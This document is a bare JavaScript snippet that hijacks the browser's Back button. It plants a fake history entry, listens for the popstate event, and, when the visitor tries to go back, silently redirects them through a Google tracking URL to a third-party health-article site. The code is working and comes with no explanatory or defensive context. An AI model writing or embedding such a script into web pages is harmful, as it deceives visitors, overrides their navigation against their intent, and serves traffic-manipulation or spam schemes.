(function(window, location) {
history.replaceState(null, document.title, location.pathname+"#!/history");
history.pushState(null, document.title, location.pathname);

window.addEventListener("popstate", function() {
  if(location.hash === "#!/history") {
    history.replaceState(null, document.title, location.pathname);
    setTimeout(function(){
      location.replace("https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=13&cad=rja&uact=8&ved=0ahUKEwifmfPWr4zYAhWBTd8KHdCtC-IQFghgMAw&url=https%3A%2F%2Farticlesonhealth.net%2Fwhich-insect-carries-a-sickness-called-malaria%2F&usg=AOvVaw1NfN7_pgolAmQKb8cObr9a");
    },0);
  }
}, false);
}(window, location));
